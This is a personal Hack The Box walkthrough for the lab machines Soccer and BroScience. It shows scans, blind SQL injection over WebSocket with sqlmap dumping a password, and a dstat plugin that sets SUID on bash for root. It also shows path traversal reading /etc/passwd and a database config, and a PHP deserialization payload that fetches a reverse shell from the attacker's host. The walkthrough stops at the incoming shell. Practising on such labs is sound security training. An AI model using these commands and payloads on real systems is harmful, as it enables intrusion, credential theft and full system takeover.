---
layout: default
---
<img align="right" src="./assets/img/ico/htb_Icon.png"  width="100" /> 
# Hack the Box Machine Resources

<br /><br />
** Notes and solution of Hack The Box machines **

_The intention is to have a kind of guidance, specially for the commands and tools_\
_used so it can be referenced qucik and easy._\
_To fully understand some of this topics, require documentation, reading and_ _practice._

_This Game is about get the flag.txt from the user and from the root._
---
_I assume anyone looking at this knows what is about and understand the concepts and code of conduct._

<br />
---

## SOCCER
---

![image](./assets/img/Soccer-htb.png)

* MACHINE:Soccer
* Level: easy
* IP: 10.10.11.194


``` bash
 Nmap 7.93 scan initiated Sun Jan  8 18:38:28 2023 as: nmap -v -sV -A -Pn -oN scanSimple 10.10.11.194
Nmap scan report for 10.10.11.194
Host is up (0.078s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://soccer.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Sun, 08 Jan 2023 17:38:50 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Sun, 08 Jan 2023 17:38:50 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9091-TCP:V=7.93%I=7%D=1/8%Time=63BAFFA4%P=x86_64-pc-linux-gnu%r(inf
SF:ormix,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\
SF:n\r\n")%r(drda,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(GetRequest,168,"HTTP/1\.1\x20404\x20Not\x20Found\r\n
SF:Content-Security-Policy:\x20default-src\x20'none'\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nCon
SF:tent-Length:\x20139\r\nDate:\x20Sun,\x2008\x20Jan\x202023\x2017:38:50\x
SF:20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=
SF:\"en\">\n<head>\n<meta\x20charset=\"utf-8\">\n<title>Error</title>\n</h
SF:ead>\n<body>\n<pre>Cannot\x20GET\x20/</pre>\n</body>\n</html>\n")%r(HTT
SF:POptions,16C,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli
SF:cy:\x20default-src\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nC
SF:ontent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20143\r
SF:\nDate:\x20Sun,\x2008\x20Jan\x202023\x2017:38:50\x20GMT\r\nConnection:\
SF:x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<met
SF:a\x20charset=\"utf-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Ca
SF:nnot\x20OPTIONS\x20/</pre>\n</body>\n</html>\n")%r(RTSPRequest,16C,"HTT
SF:P/1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr
SF:c\x20'none'\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nContent-Length:\x20143\r\nDate:\x20Sun,\x
SF:2008\x20Jan\x202023\x2017:38:50\x20GMT\r\nConnection:\x20close\r\n\r\n<
SF:!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n<meta\x20charset=\"ut
SF:f-8\">\n<title>Error</title>\n</head>\n<body>\n<pre>Cannot\x20OPTIONS\x
SF:20/</pre>\n</body>\n</html>\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
SF:(DNSStatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnecti
SF:on:\x20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan  8 18:38:57 2023 -- 1 IP address (1 host up) scanned in 29.28 seconds







❯ wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://soccer.htb/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://soccer.htb/FUZZ
Total requests: 220561

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                       
=====================================================================

000000001:   200        147 L    526 W      6917 Ch     "# directory-list-2.3-medium.txt"             
000000011:   200        147 L    526 W      6917 Ch     "# Priority ordered case sensative list, where
                                                         entries were found"                          
000000009:   200        147 L    526 W      6917 Ch     "# Suite 300, San Francisco, California, 94105
                                                        , USA."                                       
000000007:   200        147 L    526 W      6917 Ch     "# license, visit http://creativecommons.org/l
                                                        icenses/by-sa/3.0/"                           
000000013:   200        147 L    526 W      6917 Ch     "#"                                           
000000010:   200        147 L    526 W      6917 Ch     "#"                                           
000000003:   200        147 L    526 W      6917 Ch     "# Copyright 2007 James Fisher"               
000000012:   200        147 L    526 W      6917 Ch     "# on atleast 2 different hosts"              
000000014:   200        147 L    526 W      6917 Ch     "http://soccer.htb/"                          
000000006:   200        147 L    526 W      6917 Ch     "# Attribution-Share Alike 3.0 License. To vie
                                                        w a copy of this"                             
000000004:   200        147 L    526 W      6917 Ch     "#"                                           
000000005:   200        147 L    526 W      6917 Ch     "# This work is licensed under the Creative Co
                                                        mmons"                                        
000000008:   200        147 L    526 W      6917 Ch     "# or send a letter to Creative Commons, 171 S
                                                        econd Street,"                                
000000002:   200        147 L    526 W      6917 Ch     "#"                                           
000000064:   301        7 L      12 W       178 Ch      "tiny"     




```

* We found "tiny" as a directory with wfuzz 
* Below we see and research about tiny file manager vulnerability  and in this case we can login with 
* default credentials
* look for this vulnerability and follow intructions to upload the file in the server and the open it
* And wait with pwncat

![image](./assets/img/tinyFileManagerGoogle.png)

![image](./assets/img/soccershell.png)

![image](./assets/img/soccershell1.png)


``` bash

(remote) www-data@soccer:/$ cat /etc/hosts                                                            
127.0.0.1	localhost	soccer	soccer.htb	soc-player.soccer.htb

127.0.1.1	ubuntu-focal	ubuntu-focal

(remote) www-data@soccer:/$    

```

* Add soc-player.soccer.htb to our /etc/hosts
* We should easily fall in this site

![image](./assets/img/soccerSoc-playerhtb.png)

the source code reveals this

``` bash
            <div class="price pt-3 pl-3">
                    <span class="mb-2">Price</span>
                        <h5>Free</h5>
                </div>
            </div>
            <p>** Please don't forget your ticket number. **</p>
        </div>
    </div>
    <script>
        var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
        window.onload = function () {
        
        var btn = document.getElementById('btn');
        var input = document.getElementById('id');
        
        ws.onopen = function (e) {
            console.log('connected to the server')
        }
        input.addEventListener('keypress', (e) => {
            keyOne(e)
      

```


FOLLOW: https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
* pip install websocket
* pip3 install websocket-client


``` python

from http.server import SimpleHTTPRequestHandler
   2   │ from socketserver import TCPServer
   3   │ from urllib.parse import unquote, urlparse
   4   │ from websocket import create_connection
   5   │ 
   6   │ #ws_server = "ws://localhost:8156/ws"**CHANGE**
   7   │ ws_server = "ws://soc-player.soccer.htb:9091"
   8   │ 
   9   │ def send_ws(payload):
  10   │     ws = create_connection(ws_server)
  11   │     # If the server returns a response on connect, use below line   
  12   │     #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
  13   │       
  14   │     # For our case, format the payload in JSON
  15   │     message = unquote(payload).replace('"','\'') # replacing " with ' to avoi
       │ d breaking JSON structure
         # data = '{"employeeID":"%s"}' % message **CHANGE**
  16   │   data = '{"id":"%s"}' % message
  17   │ 
  18   │     ws.send(data)
  19   │     resp = ws.recv()
  20   │     ws.close()
  21   │ 
  22   │     if resp:
  23   │         return resp
  24   │     else:
  25   │         return ''

```
* In one terminal we fire the exploit
* In another terminal we fire the sqlmap as shown below

_terminal1_
```
❯ python3 sqliserver.py
```
_terminal2_
```
❯ sqlmap -u "http://localhost:8081/?id=1" -p "id" --dbs
```
![image](./assets/img/sqliServerExploit.png)


``` bash
❯ sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -tables
```

``` bash
[20:20:54] [INFO] retrieved: 
[20:21:05] [INFO] adjusting time delay to 2 seconds due to good response times
accounts
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
´´´
``` bash
❯ sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -columns
```

``` bash
[20:28:54] [INFO] retrieved: 
[20:29:05] [INFO] adjusting time delay to 2 seconds due to good response times
email
[20:29:41] [INFO] retrieved: varchar(40)
[20:31:25] [INFO] retrieved: id
[20:31:44] [INFO] retrieved: int
[20:32:16] [INFO] retrieved: password
[20:33:34] [INFO] retrieved: varchar(40)
[20:35:16] [INFO] retrieved: username
[20:36:24] [INFO] retrieved: varchar(40)
Database: soccer_db
Table: accounts
[4 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | varchar(40) |
| id       | int         |
| password | varchar(40) |
| username | varchar(40) |
+----------+-------------+

```

``` bash
❯ sqlmap -u "http://127.0.0.1:8081/?id=1" --batch -D soccer_db -T accounts -C username,password -dump
```
``` bash
[20:42:01] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[20:42:29] [INFO] adjusting time delay to 3 seconds due to good response times
PlayerOftheMatch2022
[20:46:15] [INFO] retrieved: player
Database: soccer_db
Table: accounts
[1 entry]
+----------+----------------------+
| username | password             |
+----------+----------------------+
| player   | PlayerOftheMatch2022 |
+----------+----------------------+
```
``` bash
❯ ssh player@10.10.11.194
The authenticity of host '10.10.11.194 (10.10.11.194)' can't be established.
ED25519 key fingerprint is SHA256:PxRZkGxbqpmtATcgie2b7E8Sj3pw1L5jMEqe77Ob3FE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.194' (ED25519) to the list of known hosts.
player@10.10.11.194's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jan 11 19:48:38 UTC 2023

  System load:           0.0
  Usage of /:            70.3% of 3.84GB
  Memory usage:          26%
  Swap usage:            0%
  Processes:             240
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.194
  IPv6 address for eth0: dead:beef::250:56ff:feb9:457a

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jan 11 18:10:14 2023 from 10.10.14.82
-bash-5.0$ id
uid=1001(player) gid=1001(player) groups=1001(player)
-bash-5.0$ pwd
/home/player
-bash-5.0$ ls -la
total 44
drwxr-xr-x 6 player player 4096 Jan 11 18:19 .
drwxr-xr-x 3 root   root   4096 Nov 17 09:25 ..
lrwxrwxrwx 1 root   root      9 Nov 17 09:02 .bash_history -> /dev/null
-rw-r--r-- 1 player player  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 player player 3771 Feb 25  2020 .bashrc
drwx------ 2 player player 4096 Nov 17 09:00 .cache
drwx------ 3 player player 4096 Jan 11 17:48 .gnupg
drwxrwxr-x 3 player player 4096 Jan 11 18:10 .local
-rw-r--r-- 1 player player  807 Feb 25  2020 .profile
-rw------- 1 player player 3783 Jan 11 18:19 .viminfo
drwx------ 3 player player 4096 Jan 11 17:45 snap
-rw-r----- 1 root   player   33 Jan 11 17:20 user.txt
-bash-5.0$ cat user.txt 
d4********************c2
-bash-5.0$ 
```
Looking for binaries suid we found this _doas_?

``` bash
-bash-5.0$ find / -perm -4000 2>/dev/null
**/usr/local/bin/doas**
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/umount
/usr/bin/fusermount
...

-bash-5.0$ 
```
We end up finding
* /usr/local/etc/doas.conf
* We can execute dstat as root with no password
``` bash
bash-5.0$ cat doas.conf 
permit nopass player as root cmd /usr/bin/dstat
bash-5.0$ / 
```

``` bash
bash-5.0$  doas -u root /usr/bin/dstat
You did not select any stats, using -cdngy by default.
Color support is disabled as curses does not find terminal "xterm-kitty".
--total-cpu-usage-- -dsk/total- -net/total- ---paging-- ---system--
usr sys idl wai stl| read  writ| recv  send|  in   out | int   csw 
  2   1  97   0   0|  56k   17k|   0     0 |   0     0 | 349   577 
  0   0 100   0   0|   0     0 | 198B  310B|   0     0 | 264   495 
  0   0  99   0   0|   0     0 | 272B  325B|   0     0 | 246   489 
  1   0  99   0   0|   0     0 |  66B  174B|   0     0 | 228   458 
  1   0  99   0   0|   0     0 | 254B  348B|   0     0 | 267   490 
  0   1  99   0   0|   0    40k|  66B  174B|   0     0 | 242   462 
  0   0  99   0   0|   0     0 |  66B  174B|   0     0 | 230   456 
  1   0  99   0   0|   0     0 |  66B  174B|   0     0 | 246   469 
  0   1  99   0   0|   0     0 |  66B  174B|   0     0 | 233   458 
  0   1  99   1   0|   0   604k|  66B  174B|   0     0 | 328   520

bash-5.0$ 

```
* We have write permissions in /usr/local/share/dstat 
* This is the directory plugins are stored
``` bash
bash-5.0$ ls -la /usr/local/share/dstat
total 8
drwxrwx--- 2 root player 4096 Jan 11 18:21 .
drwxr-xr-x 6 root root   4096 Nov 17 09:16 ..
bash-5.0$ 
```
* We create a plugin as so 
* Then we execute it as root

``` bash
bash-5.0$ echo 'import os;os.system("chmod u+s /bin/bash")' > dstat_privesc.py
bash-5.0$ ls
dstat_privesc.py  snap	user.txt
bash-5.0$ doas -u root /usr/bin/dstat --privesc &>/dev/null
bash-5.0$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
bash-5.0$ bash -p
bash-5.0# whoami
root
```
``` bash
bash-5.0# pwd
/root
bash-5.0# ls
app  root.txt  run.sql	snap
bash-5.0# cat root.txt 
be**************************b94
```

And we've got the flag!

<br />


# BROSCIENCE
---


![image](./assets/img/broscience.png)

<br /><br />
---

* MACHINE:Broscience
* Level: medium
* IP: 10.10.11.195


---
``` bash
# Nmap 7.93 scan initiated Thu Jan 12 19:10:35 2023 as: nmap -v -sV -A -Pn -oN scanSimple 10.10.11.195
Nmap scan report for 10.10.11.195
Host is up (0.091s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)
|   256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)
|_  256 3c6575274ae2ef9391374cfdd9d46341 (ED25519)
80/tcp  open  http     Apache httpd 2.4.54
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to https://broscience.htb/
|_http-server-header: Apache/2.4.54 (Debian)
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Issuer: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-14T19:48:36
| Not valid after:  2023-07-14T19:48:36
| MD5:   5328ddd62f3429d11d26ae8a68d86e0c
|_SHA-1: 20568d0d9e4109cde5a22021fe3f349c40d8d75b
| tls-alpn: 
|_  http/1.1
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_ssl-date: TLS randomness does not represent time
|_http-title: BroScience : Home
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 12 19:10:57 2023 -- 1 IP address (1 host up) scanned in 22.06 seconds

```
``` bash
❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "https://broscience.htb" -k
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://broscience.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/01/16 16:54:07 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> https://broscience.htb/images/]
/includes             (Status: 301) [Size: 321] [--> https://broscience.htb/includes/]
/manual               (Status: 301) [Size: 319] [--> https://broscience.htb/manual/]
/javascript           (Status: 301) [Size: 323] [--> https://broscience.htb/javascript/]
/styles               (Status: 301) [Size: 319] [--> https://broscience.htb/styles/]
```

* While exploring the web we find several usernames: _administrator, michael, john_
* Checking the directories found with gobuster we find a file _img.php_ which throws an error:
* Error: Missing 'path' parameter.

![image](./assets/img/broscience_missingPath.png)

* So probably in php it needs something like this: **$_GET['path']**
* Playing with the path tried to display /etc/passwd but it doesn't work
* Double URL encoding works so we end up displaying /etc/passwd with curl

``` bash
❯ curl -k 'https://broscience.htb/includes/img.php?path=..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```
Being able to do the above we just go for what we saw on the web

``` bash
❯ curl -k 'https://broscience.htb/includes/img.php?path=..%252F..%252F..%252F..%252F..%252F..%252F..%252Fvar%252Fwww%252Fhtml%252Fincludes%252Fdb_connect.php'
<?php
$db_host = "localhost";
$db_port = "5432";
$db_name = "broscience";
$db_user = "dbuser";
$db_pass = "RangeOfMotion%777";
$db_salt = "NaCl";

$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");

if (!$db_conn) {
    die("<b>Error</b>: Unable to connect to database");
}
?>%                                                                                           
     ~/HTB/BroScience/content     

```

``` bash
❯ curl -k 'https://broscience.htb/includes/img.php?path=..%252F..%252F..%252F..%252F..%252F..%252F..%252Fvar%252Fwww%252Fhtml%252Fincludes%252Futils.php'
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}

// Source: https://stackoverflow.com/a/4420773 (Slightly adapted)
function rel_time($from, $to = null) {
    $to = (($to === null) ? (time()) : ($to));
    $to = ((is_int($to)) ? ($to) : (strtotime($to)));
    $from = ((is_int($from)) ? ($from) : (strtotime($from)));

    $units = array
    (
        "year"   => 29030400, // seconds in a year   (12 months)
        "month"  => 2419200,  // seconds in a month  (4 weeks)
        "week"   => 604800,   // seconds in a week   (7 days)
        "day"    => 86400,    // seconds in a day    (24 hours)
        "hour"   => 3600,     // seconds in an hour  (60 minutes)
        "minute" => 60,       // seconds in a minute (60 seconds)
        "second" => 1         // 1 second
    );

    $diff = abs($from - $to);

    if ($diff < 1) {
        return "Just now";
    }

    $suffix = (($from > $to) ? ("from now") : ("ago"));

    $unitCount = 0;
    $output = "";

    foreach($units as $unit => $mult)
        if($diff >= $mult && $unitCount < 1) {
            $unitCount += 1;
            // $and = (($mult != 1) ? ("") : ("and "));
            $and = "";
            $output .= ", ".$and.intval($diff / $mult)." ".$unit.((intval($diff / $mult) == 1) ? ("") : ("s"));
            $diff -= intval($diff / $mult) * $mult;
        }

    $output .= " ".$suffix;
    $output = substr($output, strlen(", "));

    return $output;
}

class UserPrefs {
    public $theme;

    public function __construct($theme = "light") {
                $this->theme = $theme;
    }
}

function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}

function get_theme_class($theme = null) {
    if (!isset($theme)) {
        $theme = get_theme();
    }
    if (strcmp($theme, "light")) {
        return "uk-light";
    } else {
        return "uk-dark";
    }
}

function set_theme($val) {
    if (isset($_SESSION['id'])) {
        setcookie('user-prefs',base64_encode(serialize(new UserPrefs($val))));
    }
}

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
?>%  
```
* We also download the register page
* Created an account but it's not activated yet, because we have the function to activate it
 ``` bash
<?php
function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time()); # srand initiates the seed of the sequence, if we can know the time we can get the random sequence
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```
* The code above shows that _srand_ is based on time and we can predict the time 
* the sequence depends on the seed and the seed depends on the time 
* Knowing the time of the Server we can know the sequence
* And in the register.php we find this portion of code:

``` bash
 // TODO: Send the activation link to email
$activation_link = "https://broscience.htb/activate.php?code={8bFo7PVdZh5yZajVcmvLdEB3aEYY4xV4}}";
```
![image](./assets/img/broscience_activationCode.png)

* After activating the account and login we see a new theme icon
* At the bottom of the page I see that there's a link to
* **Swap_theme.php** and we can download it with curl

``` bash

class UserPrefs {
    public $theme;

    public function __construct($theme = "light") {
                $this->theme = $theme;
    }
}

function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        # Here the system unserialize the cookie, we can modify the cookie
        return $up->theme;
    } else {
        return "light";
    }
}

 .... 
#Following the code we see the frwite function
#In some server configuration file_get_contents let's us load a remote file

 class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

```
**The test will be**
_Serialize AvatarInterface Object with ImgPath = /var/www/html/something.php file_get_content('http://10.10.14.97:8000/reverse-shell.php')

``` bash
 <?php

class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() { #__wakeup is called when an obj is unserialized
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

$obj = new AvatarInterface();
$obj->tmp = 'http://10.10.15.97:8000/reverse-shell.php';
$obj->imgPath = '/var/www/html/something.php';

echo base64_encode(serialize($obj));

?>
```
``` bash
❯ php -f test.php
TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czo0MToiaHR0cDovLzEwLjEwLjE1Ljk3OjgwMDAvcmV2ZXJzZS1zaGVsbC5waHAiO3M6NzoiaW1nUGF0aCI7czoyNzoiL3Zhci93d3cvaHRtbC9zb21ldGhpbmcucGhwIjt9%
```
* Paste the payload created Avatar in a cookie manager for the User-Prefs
* Prepare a revese-shell.php and in the same directory _python3 -m http.server port_
* In another terminal we just listen with pwncat for the port 1234
* When we change the theme it triggers the payload, loads the remote reverse-shell and conects to our machine on port 1234

```
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.195 - - [17/Jan/2023 17:53:47] "GET /reverse-shell.php HTTP/1.0" 200 -```

```
``` bash
❯ ~/.local/bin/pwncat-cs 0.0.0.0 1234
/home/mac/.local/lib/python3.10/site-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated
  'class': algorithms.Blowfish,
[17:53:39] Welcome to pwncat 🐈!                                                           __main__.py:164
[17:54:44] received connection from 10.10.11.195:38298                                          bind.py:84
